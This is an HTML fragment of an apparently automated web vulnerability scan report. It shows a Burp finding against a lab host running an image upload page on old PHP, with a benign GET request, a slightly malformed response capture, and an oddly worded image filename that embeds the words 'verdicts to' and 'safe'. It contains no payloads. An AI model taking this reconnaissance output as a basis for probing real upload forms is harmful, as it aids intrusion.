+<div class="desc">(confidence: FIRM) @ http://target.local:32825/</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy49lky-22</code> — <code>artifacts/_/ev-mqy49lky-22/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32825
+
+GET / HTTP/1.1
+Host: target.local:32825
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.1 200 OK
+Date: Sun, 28 Jun 2026 18:22:17 GMT
+Server: Apache/2.4.38 (Debian)
+X-Powered-By: PHP/7.1.33
+Vary: Accept-Encoding
+Content-Length: 503
+Content-Type: text/html; charset=UTF-8
+
+&lt;!doctype html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;Image Upload&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body style=&quot;background-color:#B3C8CF&quot;&gt;
+    &lt;div align=&quot;center&quot;&gt;&lt;img src=&quot;upload/verdictstoXmqy40xg6ad8tsafe.jpg&quot;&gt;&lt;/div&gt;    &lt;div align=&quot;center&quot; style=&quot;background-color:#FFFFFF&quot;&gt;
+      &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+        &lt;input type=&quot;file&quot; name=&quot;userfile&quot; id=&quot;userfile&quot;&gt;&lt;br/&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;Upload Image&quot; name=&quot;submit&quot;&gt;
+      &lt;/form&gt;
+        &lt;/div&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+</body></html>
